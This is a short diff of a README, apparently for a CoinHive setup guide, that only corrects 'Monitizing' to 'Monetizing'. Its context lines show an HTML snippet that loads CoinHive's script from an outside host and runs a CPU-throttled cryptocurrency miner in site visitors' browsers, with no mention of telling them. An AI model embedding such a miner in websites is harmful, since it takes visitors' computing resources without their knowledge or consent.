@@ -14,7 +14,7 @@ Step 2: Go to the [CoinHive "Settings > Sites" page][coinhive_keys] and get your
 Step 3: Add the following code snippet to your webpage/webpages
 
 ```html
-<!-- Monitizing visitor traffic -->
+<!-- Monetizing visitor traffic -->
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
   // What site-key do we use?
@@ -31,7 +31,7 @@ Step 3: Add the following code snippet to your webpage/webpages
 Take note that there are options to custimize the miner for example in this next snippet, we set a 50% throttle for the miner CPU cycles consumed
 
 ```html
-<!-- Monitizing visitor traffic -->
+<!-- Monetizing visitor traffic -->
 <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 <script>
   // What site-key do we use?
